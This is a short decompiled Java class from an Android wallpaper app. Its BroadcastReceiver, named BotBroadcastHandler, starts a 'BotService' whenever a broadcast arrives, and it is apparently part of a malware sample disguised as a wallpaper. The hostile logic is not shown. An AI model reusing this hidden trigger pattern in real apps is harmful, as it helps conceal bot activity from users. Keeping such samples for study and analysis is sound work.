// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.content.Intent;
import android.content.Context;
import android.content.BroadcastReceiver;

public class BotBroadcastHandler extends BroadcastReceiver
{
    public void onReceive(final Context context, Intent intent) {
        try {
            intent = new Intent();
            intent.setAction("com.adam.CutePuppiesWallpaper.BotService");
            context.startService(intent);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
